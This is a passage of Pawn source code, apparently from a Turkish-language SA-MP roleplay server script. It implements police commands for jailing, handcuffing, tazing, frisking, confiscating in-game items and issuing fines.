					if(sscanf(params, "dddd", moneys, time, bail, bailprice)) {
						format(string, sizeof(string), "KULLANIM: /hapseat [Ceza (Max: $%d)] [Zaman (dakika)] [Kefalet (0=hayýr 1=evet)] [Kefalet Parasý]", cap);
						SendClientMessage(playerid, COLOR_WHITE, string);
						return 1;
					}
				}

				if(time < 1 || time > 25)
				return SendClientMessage(playerid, COLOR_GREY, "Hapis süresi 1-25 dakika olmalýdýr - Daha fazla dakika için Demorgan'a götürmelisiniz.");

				if(bail < 0 || bail > 1)
					return SendClientMessage(playerid, COLOR_GREY, "Kefalet seçeneðini 0 veya 1 olarak ayarlamalýsýnýz.");

				if(bailprice < 0 || bailprice > 1000)
					return SendClientMessage(playerid, COLOR_GREY, "Kefalet 0$ ile 1000$ arasýnda olabilir.");

				if(moneys < 1 || moneys > cap) {
					format(string, sizeof(string), "Para ceza 1$ %d$ arasýnda olmalýdýr.", cap);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}

				format(string, sizeof(string), "* %s adlý kiþiyi tutukladýn!", GetPlayerNameEx(suspect));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

				GivePlayerCash(suspect, -moneys);
				ResetPlayerWeaponsEx(suspect);
				if(PlayerVehicleInfo[suspect][0][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][0][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][1][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][1][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][2][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][2][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][3][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][3][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][4][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][4][pvTicket] = 0;
				}
				if(IsPlayerInRangeOfPoint(playerid, 4.0, 1528.082397, -1677.978637, 5.890625) || IsPlayerInRangeOfPoint(playerid, 4.0, 1564.830932, -1652.506469, 28.395606) || PlayerInfo[playerid][pVW] == 20002) {
					SetPlayerInterior(suspect, 6);
					PlayerInfo[suspect][pVW] = 20002;
					PlayerInfo[suspect][pInt] = 6;
					SetPlayerVirtualWorld(suspect, 20002);
					SetPlayerPos(suspect,263.343597, 77.532028, 1001.039062);
					PlayerInfo[suspect][pJailTime] = time * 60;
					PlayerInfo[suspect][pJailed] = 1;
					PhoneOnline[suspect] = 1;
					DeletePVar(suspect, "IsFrozen");
					PlayerInfo[suspect][pArrested] += 1;
					SetPlayerFree(suspect,playerid, "hapse atýldý");
					PlayerInfo[suspect][pWantedLevel] = 0;
					SetPlayerToTeamColor(suspect);
					SetPlayerWantedLevel(suspect, 0);
					WantLawyer[suspect] = 1;
					TogglePlayerControllable(suspect, 1);
					ClearAnimations(suspect, 1);
					SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
					if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
						PlayerDragged[suspect] = 0;
						PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
					}
					PlayerCuffed[suspect] = 0;
					DeletePVar(suspect, "PlayerCuffed");
					PlayerCuffedTime[suspect] = 0;
					PlayCrimeReportForPlayer(playerid, suspect, 6);
					if(IsPlayerAttachedObjectSlotUsed(suspect, 0)) RemovePlayerAttachedObject(suspect, 0);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 4.0, 304.796508, -1526.349731, 76.539062) || IsPlayerInRangeOfPoint(playerid, 4.0, 298.313842, -1536.036865, 24.593750) || PlayerInfo[playerid][pVW] == 1324123) {
					LoadObjectsForPlayer(suspect);
					if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
						PlayerDragged[suspect] = 0;
						PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
					}
					SetPlayerInterior(suspect, 1);
					PlayerInfo[suspect][pVW] = 1324123;
					PlayerInfo[suspect][pInt] = 1;
					SetPlayerVirtualWorld(suspect, 1324123);
					SetPlayerPos(suspect,315.1677,-1451.5564,-33.5292);

					format(PlayerInfo[suspect][pPrisonReason], 128, "FBI Arrest [%d stars]", PlayerInfo[suspect][pWantedLevel]);
					format(PlayerInfo[suspect][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));

					PlayerInfo[suspect][pJailTime] = time * 60;
					PlayerInfo[suspect][pJailed] = 2;
					PhoneOnline[suspect] = 1;
					DeletePVar(suspect, "IsFrozen");
					PlayerInfo[suspect][pArrested] += 1;
					SetPlayerFree(suspect,playerid, "hapse atýldý");
					PlayerInfo[suspect][pWantedLevel] = 0;
					SetPlayerToTeamColor(suspect);
					SetPlayerWantedLevel(suspect, 0);
					WantLawyer[suspect] = 1;
					TogglePlayerControllable(suspect, 1);
					ClearAnimations(suspect, 1);
					SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
					PlayerCuffed[suspect] = 0;
					DeletePVar(suspect, "PlayerCuffed");
					PlayerCuffedTime[suspect] = 0;
					PlayCrimeReportForPlayer(playerid, suspect, 6);
					if(IsPlayerAttachedObjectSlotUsed(suspect, 0)) RemovePlayerAttachedObject(suspect, 0);
				}
				if(bail == 1) {
					JailPrice[suspect] = bailprice;
					format(string, sizeof(string), " %d saniye hapistesin ve %d$ ödedin.   Kefalet: %d$", PlayerInfo[suspect][pJailTime], moneys, JailPrice[suspect]);
					SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				} else {
					JailPrice[suspect] = 0;
					format(string, sizeof(string), " %d saniye hapistesin ve %d$ ödedin.   Kefalet: Hayýr", PlayerInfo[suspect][pJailTime], moneys);
					SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				}
			} else SendClientMessage(playerid, COLOR_GREY, "   Tutuklamak için yeterince yakýn deðilsin.");
		} else SendClientMessage(playerid, COLOR_GREY, "   Tutuklamak için yeterince yakýn deðilsin.");
	} else SendClientMessage(playerid, COLOR_GREY, " Polis/FBI deðilsin!");
	return 1;
}

CMD:arananlar(playerid, params[])
{
	if(IsACop(playerid) || IsInLSFMD(playerid) || PlayerInfo[playerid][pJob] == 2 || PlayerInfo[playerid][pJob2] == 2 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		new string[128], x;

		SendClientMessage(playerid, COLOR_GREEN, "Arananlar Listesi:");
		foreach(Player, i)
		{
			if(PlayerInfo[i][pWantedLevel] >= 1)
			{
				format(string, sizeof(string), "%s%s: %d", string,GetPlayerNameEx(i),PlayerInfo[i][pWantedLevel]);
				x++;
				if(x > 3) {
					SendClientMessage(playerid, COLOR_YELLOW, string);
					x = 0;
					format(string, sizeof(string), " ");
				} else {
					format(string, sizeof(string), "%s, ", string);
				}
			}
		}
		if(x <= 3 && x > 0)
		{
			string[strlen(string)-2] = '.';
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Polis / Avukat / FBI Deðilsin!");
	}
	return 1;
}

CMD:kelepce(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kelepce [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				if(giveplayerid == playerid)
					return SendClientMessage(playerid, COLOR_GREY, "Kendi kendini kelepçeleyemezsin!");

				if(GetPVarInt(giveplayerid, "Injured") == 1)
					return SendClientMessage(playerid, COLOR_GREY, "Yaralanmýþ kiþileri kelepçeleyemezsin.");

				if(GetPVarInt(playerid, "Injured") == 1)
					return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

				if(PlayerCuffed[giveplayerid] == 1 || GetPlayerSpecialAction(giveplayerid) == SPECIAL_ACTION_HANDSUP) {
					format(string, sizeof(string), "* %s adlý kiþi tarafýndan kelepçelendin.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s adlý kiþinin ellerini arkasýna zorla götürdün ve kelepçeledin.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s, %s adlý kiþinin ellerini arkasýna zorla götürür ve kelepçeler.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~r~KELEPCELENDI", 2500, 3);
					TogglePlayerControllable(giveplayerid, 0);
					ClearAnimations(giveplayerid);
					PlayerCuffed[giveplayerid] = 2;
					SetPVarInt(giveplayerid, "PlayerCuffed", 2);
					SetPVarInt(giveplayerid, "IsFrozen", 1);
					PlayerCuffedTime[giveplayerid] = 300;
     				SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
         			SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
         			ApplyAnimation(giveplayerid,"ped","cower",1,1,0,0,0,0,1);
				} else return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu etkisiz hale getirilmemiþ!");
			} else return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}else return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	} else SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	return 1;
}

CMD:kelepcecikar(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kelepcecikar [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[giveplayerid][pJailed] >= 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Hapsedilmiþ bir kiþinin kelepçesini çözemezsin.");
					return 1;
				}
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendi kelepçeni çözemezsin."); return 1; }
				if(PlayerCuffed[giveplayerid]>1)
				{
				    PreloadAnims(giveplayerid);
					DeletePVar(giveplayerid, "IsFrozen");
					format(string, sizeof(string), "* %s adlý kiþi tarafýndan kelepçen çýkarýldý.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s adlý kiþinin kelepçelerini çýkardýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþinin kelepçelerini çýkardý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~g~KELEPCE CIKARILDI", 2500, 3);
					TogglePlayerControllable(giveplayerid, 1);
					SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_DANCE1);
					PlayerCuffed[giveplayerid] = 0;
                    PlayerCuffedTime[giveplayerid] = 0;
					DeletePVar(giveplayerid, "PlayerCuffed");
					if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
						PlayerDragged[giveplayerid] = 0;
						PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
					}
					ClearAnimations(giveplayerid, 1);
					SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_NONE);
				 	if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
						RemovePlayerAttachedObject(giveplayerid, 0);
					//ResyncPlayer(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu kiþi kelepçeli deðil.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

/*CMD:resync(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 2)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkin yok.");

	new
		iTarget;

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /resync [Oyuncu ID/Ýsim]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

	new
	    szMessage[128];

	format(szMessage, sizeof(szMessage), "{AA3333}AdminUyarýsý{FFFF00}: %s has resynced %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget));
	ABroadCast(COLOR_YELLOW, szMessage, 2);

    ResyncPlayer(iTarget);
    return 1;
}*/

CMD:tazer(playerid, params[])
{
	if(IsACop(playerid)|| PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128];
		if(PlayerInfo[playerid][pConnectTime] < 2)
			return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "Araçtayken bunu yapamazsýn.");

		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");

		if(GetPVarInt(playerid, "EventToken") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "Tazerini etkinlikteyken kullanamazsýn.");

		if(PlayerCuffedTime[playerid] > 0)
		 return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

		if(GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

		if(PlayerInfo[playerid][pJailed] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Hapiste bunu kullanamazsýn.");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Kelepçeli yada tazerliyken bunu kullanamazsýn.");


		if(pTazer[playerid] == 0) {
			pTazerReplace[playerid] = PlayerInfo[playerid][pGuns][2];
			if(PlayerInfo[playerid][pGuns][2] != 0) RemovePlayerWeapon(playerid, PlayerInfo[playerid][pGuns][2]);
			format(string, sizeof(string), "* %s Tazer'ýný kýlýfýndan çýkarýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GivePlayerValidWeapon(playerid, 23, 60000);
			pTazer[playerid] = 1;
		} else {
			RemovePlayerWeapon(playerid, 23);
			GivePlayerValidWeapon(playerid, pTazerReplace[playerid], 60000);
			format(string, sizeof(string), "* %s Tazer'ýný kýlýfýna geri koyar.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			pTazer[playerid] = 0;
		}
	} else return SendClientMessage(playerid, COLOR_GREY, " Polis/FBI deðilsin!");
	return 1;
}

CMD:ustunuara(playerid, params[]) {
	new string[128], giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ustunuara [Oyuncu ID/Ýsim]");

 	if(giveplayerid == INVALID_PLAYER_ID)
	 	return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi oyunda deðil.");

	if(ProxDetectorS(8.0, playerid, giveplayerid)) {
		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "Kendi kendini arýyamazsýn!");

		if(giveplayerid == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(IsACop(playerid) || PlayerInfo[playerid][pJob] == 8 || PlayerInfo[playerid][pJob2] == 8 || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5)) {
			SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s' eþyalarý...  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(PlayerInfo[giveplayerid][pWSeeds] == 1)
				SendClientMessage(playerid, COLOR_GREY, "Marijuana Tohumlarý");

			if(PlayerInfo[giveplayerid][pPhoneBook] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Telefon Defteri.");

			if(PlayerInfo[giveplayerid][pCDPlayer] > 0)
				SendClientMessage(playerid, COLOR_GREY, "CD player.");

			if(PlayerInfo[giveplayerid][pRadio] > 0) {
				format(string, sizeof(string), "Taþýnabilir Radyo (frekans #%d kHz)", PlayerInfo[giveplayerid][pRadioFreq]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}

			if(PlayerInfo[giveplayerid][pCarLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Sürücü lisansý.");

			if(PlayerInfo[giveplayerid][pBoatLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Gemici lisansý.");

			if(PlayerInfo[giveplayerid][pFlyLic] > 0)
				SendClientMessage(playerid, COLOR_GREY, "Pilot lisansý.");

			if(PlayerInfo[giveplayerid][pCrack] > 0) {
				format(string, sizeof(string), "%d gram crack.", PlayerInfo[giveplayerid][pCrack]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(PlayerInfo[giveplayerid][pPot] > 0) {
				format(string, sizeof(string), "%d gram pot.", PlayerInfo[giveplayerid][pPot]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(PlayerInfo[giveplayerid][pMats] > 0) {
				format(string, sizeof(string), "%d materyal.", PlayerInfo[giveplayerid][pMats]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			if(Fishes[giveplayerid][pWeight1] > 0 || Fishes[giveplayerid][pWeight2] > 0 || Fishes[giveplayerid][pWeight3] > 0 || Fishes[giveplayerid][pWeight4] > 0 || Fishes[giveplayerid][pWeight5] > 0) {
				format(string, sizeof(string), "%d balýk.", PlayerInfo[giveplayerid][pFishes]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}

			new weaponname[50];
			format(string, sizeof(string), "*** %s' Silahlarý...  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			for(new i = 0; i < 12; i++) {
				if(PlayerInfo[giveplayerid][pGuns][i] > 0) {
					GetWeaponName(PlayerInfo[giveplayerid][pGuns][i], weaponname, sizeof(weaponname));
					format(string, sizeof(string), "Silah: %s.", weaponname);
					SendClientMessage(playerid, COLOR_GRAD1, string);
				}
			}

			SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþinin üstünü aradý.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		} else {
		    SetPVarInt(giveplayerid, "FriskREQ", playerid);

		    format(string, sizeof(string), "* %s(ID: %d) adlý kiþinin üstünü aramaya çalýþýyorsun.Kiþi '/kabulet ustunuara' yazmalýdýr.", GetPlayerNameEx(giveplayerid), giveplayerid);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

		    format(string, sizeof(string), "* %s adlý kiþi üstünü aramak istiyor, örnek: '/kabulet ustunuara'.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
		}
	} else return SendClientMessage(playerid, COLOR_GREY, "Çok uzaktasýn!");
	return 1;
}

CMD:ustundenal(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		if(PlayerInfo[playerid][pRank] < 1 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için Rank 2 ve üstü olmalýsýn!");
			return 1;
		}

		new string[128], choice[32], giveplayerid;
		if(sscanf(params, "s[32]u", choice, giveplayerid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ustundenal [Ýsim] [Oyuncu ID]");
			SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Silahlar, Pot, Crack, Tohumlar, Radyo.");
			return 1;
		}
		if(strcmp(choice,"radyo",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* %s adlý kiþinin radyosuna el koydun.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s radyona el koydu.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþinin radyosuna el koyar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pRadio] = 0;
					PlayerInfo[giveplayerid][pRadioFreq] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				return 1;
			}
		}
		else if(strcmp(choice,"silahlar",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* %s adlý kiþinin silahlarýna el koydun.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s silahlarýna el koydu.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþinin silahlarýna el koyar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					ResetPlayerWeaponsEx(giveplayerid);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				return 1;
			}
		}
		else if(strcmp(choice,"tohumlar",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* %s adlý kiþinin tohumlarýna el koydun.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s senin tohumlarýna el koydu.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþinin tohumlarýna el koyar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pWSeeds] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				return 1;
			}
		}
		else if(strcmp(choice,"pot",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "* %s adlý kiþinin potlarýna el koydun.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s senin potlarýna el koydu.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþinin potlarýna el koyar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pPot] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				return 1;
			}
		}
		else if(strcmp(choice,"crack",true) == 0)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					format(string, sizeof(string), "*  %s adlý kiþinin cracklerine el koydun.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s senin cracklerine el koydu.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþinin cracklerine el koyar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					PlayerInfo[giveplayerid][pCrack] = 0;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}

			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Yanlýþ item seçildi.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Los Santos Devleti güvenlik güçlerinde deðilsin(LSPD/FBI/GOV).");
		return 1;
	}
	return 1;
}

CMD:cezakes(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5))
	{

		new string[128], giveplayerid, moneys, reason[64];
		if(sscanf(params, "uds[64]", giveplayerid, moneys, reason)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /cezakes [Oyuncu ID/Ýsim] [fiyat] [sebep]");

		if(giveplayerid == playerid)
		{
			SendClientMessage(playerid, COLOR_GREY, "Kendi kendine ceza kesemezsin.");
			return 1;
		}

		if(moneys < 1 || moneys > 1500) { SendClientMessage(playerid, COLOR_GREY, "Ceza 1-1500$ arasýnda olmalýdýr."); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					if(giveplayerid == playerid) return 1;

					format(string, sizeof(string), "* %s adlý kiþiye %d$ ceza kestin, sebep: %s", GetPlayerNameEx(giveplayerid), moneys, reason);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s sana %d$ ceza kesiyor, sebep: %s", GetPlayerNameEx(playerid), moneys, reason);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* Memur %s, %s adlý kiþiye ceza keser, Makbuzu uzatýr.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "Kabul etmek için /kabulet ceza yaz.");
					TicketOffer[giveplayerid] = playerid;
					TicketMoney[giveplayerid] = moneys;
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}
			}
		}
		else
